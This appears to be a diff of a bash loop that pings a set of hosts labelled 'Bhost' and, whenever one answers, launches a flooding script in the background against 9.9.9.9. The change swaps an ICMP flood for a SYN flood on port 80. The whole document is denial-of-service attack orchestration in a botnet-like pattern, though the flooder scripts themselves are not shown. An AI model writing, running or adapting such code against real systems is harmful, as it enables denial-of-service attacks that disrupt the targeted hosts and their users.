@@ -1,8 +1,8 @@
 while true; do
 	if (( ping 210.0.0.101 -c 1 | grep -q 'from'))
 	then
-			echo "Bhost 1 found - ICMP attack"
-			sh icmp/flooder_simple.sh 9.9.9.9 & 
+			echo "Bhost 1 found - SYN attack"
+			sh syn-flood/flooder_simple.sh 9.9.9.9 80 &
 	fi
 	if (( ping 210.0.0.102 -c 1 | grep -q 'from'))
 	then
